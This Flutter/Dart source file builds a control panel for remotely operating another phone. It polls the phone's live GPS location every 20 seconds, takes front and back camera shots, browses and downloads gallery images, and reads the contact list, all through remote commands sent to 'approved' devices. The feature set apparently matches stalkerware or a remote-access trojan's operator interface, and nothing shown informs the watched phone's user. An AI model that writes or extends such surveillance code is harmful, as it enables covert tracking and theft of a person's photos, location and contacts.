import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:webview_flutter/webview_flutter.dart';

import 'core.dart';
import 'remote_console.dart';

const Color gold = Color(0xFFF5E6C8);
const MethodChannel _gChan = MethodChannel('aniket_pro_ai/gallery');

// ═══════════════════════════════════════════════════════════════════════
//  REMOTE DEVICE PREVIEW — phone-style screen showing the REMOTE phone
//  (default tab = Location, no mic anywhere)
// ═══════════════════════════════════════════════════════════════════════
class DevicePreviewCard extends StatefulWidget {
  const DevicePreviewCard({super.key});

  @override
  State<DevicePreviewCard> createState() => _DevicePreviewCardState();
}

class _DevicePreviewCardState extends State<DevicePreviewCard> {
  List<Map<String, String>> _devices = [];
  String? _dev;
  String _tab = 'location';
  bool _online = false;

  // location
  Map<String, dynamic>? _loc;
  DateTime? _locAt;
  String _locErr = '';
  bool _locBusy = false;
  WebViewController? _mapCtrl;
  Timer? _locTimer;

  // camera
  Uint8List? _camImg;
  String _camBusy = '';

  // gallery
  List<Map<String, dynamic>> _gal = [];
  bool _galBusy = false;
  String _galOpen = '';

  // contacts
  List<Map<String, dynamic>> _con = [];
  bool _conBusy = false;

  @override
  void initState() {
    super.initState();
    _loadDevices();
  }

  @override
  void dispose() {
    _locTimer?.cancel();
    super.dispose();
  }

  void _snack(String t) {
    if (mounted) {
      ScaffoldMessenger.of(context)
          .showSnackBar(SnackBar(content: Text(t), backgroundColor: const Color(0xFF2A2A2A)));
    }
  }

  Future<void> _loadDevices() async {
    try {
      final rows = (jsonDecode(await httpGet(kSheetUrl)) as List).cast<List<dynamic>>();
      final Map<String, Map<String, String>> map = {};
      for (final r in rows) {
        if (r.length < 5) continue;
        final type = r[1].toString();
        final id   = r[2].toString();
        final dev  = r[3].toString();
        final e = map.putIfAbsent(dev, () => {'id': '', 'status': ''});
        if (type == 'request') e['id'] = id;
        if (type == 'approve') e['status'] = 'APPROVED';
        if (type == 'ban')     e['status'] = 'BANNED';
      }
      final list = map.entries
          .where((e) => e.value['status'] == 'APPROVED')
          .map((e) => {'device': e.key, 'id': e.value['id'] ?? ''})
          .toList();
      if (!mounted) return;
      setState(() {
        _devices = list;
        if (_dev == null || !list.any((d) => d['device'] == _dev)) {
          _dev = list.isEmpty ? null : list.first['device'];
        }
      });
      if (_dev != null) {
        await _pullInfo();
        _onTabChanged();
      }
    } catch (_) {}
  }

  Future<void> _pullInfo() async {
    if (_dev == null) return;
    final i = await remoteInfoOf(_dev!);
    if (!mounted) return;
    setState(() => _online = infoOnline(i));
  }

  void _resetData() {
    _stopLocTimer();
    setState(() {
      _loc = null;
      _locAt = null;
      _locErr = '';
      _mapCtrl = null;
      _camImg = null;
      _gal = [];
      _con = [];
    });
  }

  void _onDeviceChanged(String? v) {
    if (v == null || v == _dev) return;
    setState(() => _dev = v);
    _resetData();
    _pullInfo();
    _onTabChanged();
  }

  void _onTabChanged() {
    if (_tab == 'location') {
      _startLocTimer();
    } else {
      _stopLocTimer();
    }
    if (_tab == 'gallery' && _gal.isEmpty) _loadGal();
    if (_tab == 'contacts' && _con.isEmpty) _loadCon();
  }

  void _setTab(String t) {
    if (_tab == t) return;
    setState(() => _tab = t);
    _onTabChanged();
  }

  // ── location ─
  void _startLocTimer() {
    _locTimer?.cancel();
    _reqLoc();
    _locTimer = Timer.periodic(const Duration(seconds: 20), (_) => _reqLoc());
  }

  void _stopLocTimer() {
    _locTimer?.cancel();
    _locTimer = null;
  }

  Future<void> _reqLoc() async {
    if (_dev == null || _locBusy) return;
    setState(() => _locBusy = true);
    final res = await remoteCmd(_dev!, 'loc');
    if (!mounted) return;
    setState(() => _locBusy = false);
    if (res == null) {
      setState(() => _locErr = 'No response from phone');
      return;
    }
    if (res['ok'] != true) {
      setState(() => _locErr = res['err'] == 'no_perm'
          ? 'Location permission OFF on phone'
          : 'No location fix yet (GPS on?)');
      return;
    }
    final d = res['data'];
    if (d is Map && d['lat'] != null) {
      setState(() {
        _loc = Map<String, dynamic>.from(d);
        _locAt = DateTime.now();
        _locErr = '';
      });
      if (_mapCtrl == null) _initMap();
    } else {
      setState(() => _locErr = 'No location fix yet (GPS on?)');
    }
  }

  String _mapUrl() {
    final lat = (_loc?['lat'] as num?)?.toDouble() ?? 23.7;
    final lng = (_loc?['lng'] as num?)?.toDouble() ?? 90.4;
    return 'https://www.openstreetmap.org/export/embed.html'
        '?bbox=${lng - 0.008},${lat - 0.004},${lng + 0.008},${lat + 0.004}'
        '&layer=mapnik&marker=$lat,$lng';
  }

  void _initMap() {
    if (_mapCtrl != null) return;
    _mapCtrl = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..loadRequest(Uri.parse(_mapUrl()));
    if (mounted) setState(() {});
  }

  void _refreshMap() {
    if (_mapCtrl == null) {
      _initMap();
    } else {
      _mapCtrl!.loadRequest(Uri.parse(_mapUrl()));
    }
  }

  Future<void> _openMapApp() async {
    if (_loc == null) return;
    final lat = (_loc!['lat'] as num?)?.toDouble() ?? 0;
    final lng = (_loc!['lng'] as num?)?.toDouble() ?? 0;
    await _gChan.invokeMethod('openUrl', 'https://www.google.com/maps?q=$lat,$lng');
  }

  // ── camera ──
  Future<void> _snap(bool front) async {
    if (_dev == null || _camBusy.isNotEmpty) return;
    setState(() => _camBusy = front ? 'f' : 'b');
    final res = await remoteCmd(_dev!, front ? 'camfront' : 'camback');
    if (!mounted) return;
    setState(() => _camBusy = '');
    if (res != null && res['ok'] == true) {
      final b64 = (res['data'] as Map?)?['img']?.toString();
      if (b64 != null) {
        setState(() => _camImg = base64Decode(b64));
        return;
      }
    }
    _snack(res == null ? 'No response from phone' : 'Camera failed on phone');
  }

  // ── gallery ──
  Future<void> _loadGal() async {
    if (_dev == null || _galBusy) return;
    setState(() => _galBusy = true);
    final res = await remoteCmd(_dev!, 'galleryList');
    if (!mounted) return;
    setState(() => _galBusy = false);
    if (res != null && res['ok'] == true && res['data'] is List) {
      setState(() => _gal = (res['data'] as List).map((e) => Map<String, dynamic>.from(e as Map)).toList());
    }
  }

  Future<void> _openGal(String path) async {
    if (_dev == null || _galOpen.isNotEmpty) return;
    setState(() => _galOpen = path);
    final res = await remoteCmd(_dev!, 'galleryGet', path: path);
    if (!mounted) return;
    setState(() => _galOpen = '');
    if (res != null && res['ok'] == true) {
      final b64 = (res['data'] as Map?)?['img']?.toString();
      if (b64 != null) {
        Navigator.push(context,
            MaterialPageRoute(builder: (_) => FullImageView(bytes: base64Decode(b64))));
        return;
      }
    }
    _snack('Could not fetch image');
  }

  // ── contacts ──
  Future<void> _loadCon() async {
    if (_dev == null || _conBusy) return;
    setState(() => _conBusy = true);
    final res = await remoteCmd(_dev!, 'contacts');
    if (!mounted) return;
    setState(() => _conBusy = false);
    if (res != null && res['ok'] == true && res['data'] is List) {
      setState(() => _con = (res['data'] as List).map((e) => Map<String, dynamic>.from(e as Map)).toList());
    } else if (res != null && res['ok'] != true) {
      _snack(res['err'] == 'no_perm' ? 'Contacts permission OFF on phone' : 'Contacts failed');
    }
  }

  Widget _tabBtn(String key, IconData icon, String label) {
    final on = _tab == key;
    return Expanded(
      child: InkWell(
        onTap: () => _setTab(key),
        borderRadius: BorderRadius.circular(10),
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 8),
          decoration: BoxDecoration(
            color: on ? gold.withOpacity(0.2) : Colors.transparent,
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: on ? gold : Colors.white12),
          ),
          child: Column(children: [
            Icon(icon, color: on ? gold : Colors.white38, size: 18),
            const SizedBox(height: 2),
            Text(label, style: TextStyle(color: on ? gold : Colors.white38, fontSize: 9)),
          ]),
        ),
      ),
    );
  }

  Widget _locScreen() {
    final lat = (_loc?['lat'] as num?)?.toDouble();
    final lng = (_loc?['lng'] as num?)?.toDouble();
    final acc = (_loc?['acc'] as num?)?.toDouble() ?? 0;
    final ago = _locAt == null ? 0 : DateTime.now().difference(_locAt!).inSeconds;
    return Column(children: [
      SizedBox(
        height: 175,
        width: double.infinity,
        child: _mapCtrl == null
            ? Container(
                color: const Color(0xFF1A1A1A),
                child: Center(
                  child: _locBusy
                      ? const CircularProgressIndicator(color: gold, strokeWidth: 2)
                      : Text(_locErr.isEmpty ? 'Fetching location...' : _locErr,
                          textAlign: TextAlign.center,
                          style: const TextStyle(color: Colors.white38, fontSize: 10)),
                ),
              )
            : WebViewWidget(controller: _mapCtrl!),
      ),
      const SizedBox(height: 8),
      Row(mainAxisAlignment: MainAxisAlignment.center, children: [
        Icon(Icons.gps_fixed_rounded, color: _online ? Colors.green : Colors.orange, size: 16),
        const SizedBox(width: 5),
        Text(_online ? 'LIVE' : 'OFFLINE',
            style: TextStyle(
                color: _online ? Colors.green : Colors.orange,
                fontSize: 11,
                fontWeight: FontWeight.w800,
                letterSpacing: 2)),
        const SizedBox(width: 10),
        Text(ago == 0 ? 'just updated' : '${ago}s ago',
            style: const TextStyle(color: Colors.white38, fontSize: 10)),
      ]),
      const SizedBox(height: 5),
      if (lat != null && lng != null)
        Text('${lat.toStringAsFixed(6)}, ${lng.toStringAsFixed(6)}',
            style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold)),
      const SizedBox(height: 3),
      Text('Accuracy: ±${acc.toStringAsFixed(0)} m',
          style: const TextStyle(color: Colors.white54, fontSize: 10)),
      if (_locErr.isNotEmpty && lat == null)
        Padding(
          padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 4),
          child: Text(_locErr,
              textAlign: TextAlign.center,
              style: const TextStyle(color: Colors.white38, fontSize: 10)),
        ),
      const SizedBox(height: 8),
      Row(mainAxisAlignment: MainAxisAlignment.center, children: [
        InkWell(
          onTap: () { _reqLoc(); _refreshMap(); },
          child: Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(
                color: gold.withOpacity(0.15),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: gold.withOpacity(0.4))),
            child: const Row(mainAxisSize: MainAxisSize.min, children: [
              Icon(Icons.refresh_rounded, color: gold, size: 14),
              SizedBox(width: 4),
              Text('Refresh',
                  style: TextStyle(color: gold, fontSize: 11, fontWeight: FontWeight.bold)),
            ]),
          ),
        ),
        const SizedBox(width: 8),
        InkWell(
          onTap: _openMapApp,
          child: Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.06),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.white24)),
            child: const Row(mainAxisSize: MainAxisSize.min, children: [
              Icon(Icons.open_in_new_rounded, color: Colors.white54, size: 14),
              SizedBox(width: 4),
              Text('Big Map', style: TextStyle(color: Colors.white54, fontSize: 11)),
            ]),
          ),
        ),
      ]),
    ]);
  }

  Widget _camScreen() {
    return Column(children: [
      Expanded(
        child: _camImg == null
            ? Center(
                child: _camBusy.isNotEmpty
                    ? const CircularProgressIndicator(color: gold, strokeWidth: 2)
                    : const Column(mainAxisSize: MainAxisSize.min, children: [
                        Icon(Icons.photo_camera_rounded, color: Colors.white24, size: 34),
                        SizedBox(height: 8),
                        Text('Tap a button to snap',
                            style: TextStyle(color: Colors.white38, fontSize: 11)),
                      ]),
              )
            : Center(
                child: _camBusy.isNotEmpty
                    ? const CircularProgressIndicator(color: gold, strokeWidth: 2)
                    : Image.memory(_camImg!, fit: BoxFit.contain),
              ),
      ),
      Padding(
        padding: const EdgeInsets.all(8),
        child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
          InkWell(
            onTap: () => _snap(true),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
              decoration: BoxDecoration(
                  color: gold.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: gold.withOpacity(0.4))),
              child: const Row(mainAxisSize: MainAxisSize.min, children: [
                Icon(Icons.face_rounded, color: gold, size: 15),
                SizedBox(width: 5),
                Text('Front Cam',
                    style: TextStyle(color: gold, fontSize: 11, fontWeight: FontWeight.bold)),
              ]),
            ),
          ),
          const SizedBox(width: 10),
          InkWell(
            onTap: () => _snap(false),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
              decoration: BoxDecoration(
                  color: gold.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: gold.withOpacity(0.4))),
              child: const Row(mainAxisSize: MainAxisSize.min, children: [
                Icon(Icons.photo_camera_rounded, color: gold, size: 15),
                SizedBox(width: 5),
                Text('Back Cam',
                    style: TextStyle(color: gold, fontSize: 11, fontWeight: FontWeight.bold)),
              ]),
            ),
          ),
        ]),
      ),
    ]);
  }

  Widget _galScreen() {
    if (_galBusy && _gal.isEmpty) {
      return const Center(child: CircularProgressIndicator(color: gold, strokeWidth: 2));
    }
    if (_gal.isEmpty) {
      return const Center(child: Text('No images found',
          style: TextStyle(color: Colors.white38, fontSize: 11)));
    }
    return ListView.builder(
      padding: const EdgeInsets.all(4),
      itemCount: _gal.length > 100 ? 100 : _gal.length,
      itemBuilder: (_, i) {
        final m = _gal[i];
        final dt = DateTime.fromMillisecondsSinceEpoch(((m['date'] as num?)?.toInt() ?? 0) * 1000);
        return ListTile(
          dense: true,
          leading: _galOpen == m['path']
              ? const SizedBox(width: 18, height: 18,
                  child: CircularProgressIndicator(strokeWidth: 2, color: gold))
              : const Icon(Icons.image_rounded, color: Colors.white38, size: 20),
          title: Text(m['name']?.toString() ?? '',
              style: const TextStyle(color: Colors.white, fontSize: 12)),
          subtitle: Text('${dt.day}/${dt.month}/${dt.year}',
              style: const TextStyle(color: Colors.white38, fontSize: 10)),
          trailing: const Icon(Icons.download_rounded, color: gold, size: 16),
          onTap: () => _openGal(m['path']?.toString() ?? ''),
        );
      },
    );
  }

  Widget _conScreen() {
    if (_conBusy && _con.isEmpty) {
      return const Center(child: CircularProgressIndicator(color: gold, strokeWidth: 2));
    }
    if (_con.isEmpty) {
      return const Center(child: Text('No contacts found',
          style: TextStyle(color: Colors.white38, fontSize: 11)));
    }
    return ListView.builder(
      padding: const EdgeInsets.all(4),
      itemCount: _con.length > 100 ? 100 : _con.length,
      itemBuilder: (_, i) {
        final m = _con[i];
        return ListTile(
          dense: true,
          leading: const Icon(Icons.person_rounded, color: Colors.white38, size: 20),
          title: Text(m['name']?.toString() ?? '',
              style: const TextStyle(color: Colors.white, fontSize: 12)),
          subtitle: Text(m['num']?.toString() ?? '',
              style: const TextStyle(color: Colors.white38, fontSize: 10)),
        );
      },
    );
  }

  Widget _screen() {
    switch (_tab) {
      case 'camera': return _camScreen();
      case 'gallery': return _galScreen();
      case 'contacts': return _conScreen();
      default: return _locScreen();
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.fromLTRB(12, 0, 12, 12),
      padding: const EdgeInsets.all(10),
      decoration: BoxDecoration(
        color: Colors.black,
        borderRadius: BorderRadius.circular(26),
        border: Border.all(color: gold.withOpacity(0.4), width: 1.5),
      ),
      child: Column(children: [
        Container(
          width: 56, height: 5,
          decoration: BoxDecoration(color: Colors.white24, borderRadius: BorderRadius.circular(3)),
        ),
        const SizedBox(height: 8),
        Row(children: [
          const Icon(Icons.phone_android_rounded, color: gold, size: 16),
          const SizedBox(width: 6),
          Expanded(
            child: _devices.isEmpty
                ? const Text('No approved device',
                    style: TextStyle(color: Colors.white38, fontSize: 11))
                : DropdownButtonHideUnderline(
                    child: DropdownButton<String>(
                      value: _dev,
                      isExpanded: true,
                      dropdownColor: const Color(0xFF1E1E1E),
                      style: const TextStyle(color: Colors.white, fontSize: 12),
                      items: _devices
                          .map((d) => DropdownMenuItem(
                                value: d['device'],
                                child: Text(d['id'] ?? d['device'] ?? '',
                                    overflow: TextOverflow.ellipsis),
                              ))
                          .toList(),
                      onChanged: _onDeviceChanged,
                    ),
                  ),
          ),
          Container(
            width: 9, height: 9,
            decoration: BoxDecoration(
                shape: BoxShape.circle, color: _online ? Colors.green : Colors.grey),
          ),
          const SizedBox(width: 6),
          InkWell(
            onTap: () {
              _pullInfo();
              _resetData();
              _onTabChanged();
            },
            child: const Icon(Icons.refresh_rounded, color: gold, size: 16),
          ),
        ]),
        const SizedBox(height: 6),
        if (!_online)
          const Padding(
            padding: EdgeInsets.only(bottom: 6),
            child: Text('Phone offline — commands will fail until it comes online',
                textAlign: TextAlign.center,
                style: TextStyle(color: Colors.orange, fontSize: 9)),
          ),
        Row(children: [
          _tabBtn('camera', Icons.photo_camera, 'Camera'),
          const SizedBox(width: 4),
          _tabBtn('gallery', Icons.photo_library, 'Gallery'),
          const SizedBox(width: 4),
          _tabBtn('location', Icons.place, 'Location'),
          const SizedBox(width: 4),
          _tabBtn('contacts', Icons.contacts, 'Contacts'),
        ]),
        const SizedBox(height: 8),
        ClipRRect(
          borderRadius: BorderRadius.circular(16),
          child: SizedBox(height: 340, width: double.infinity, child: _screen()),
        ),
      ]),
    );
  }
}
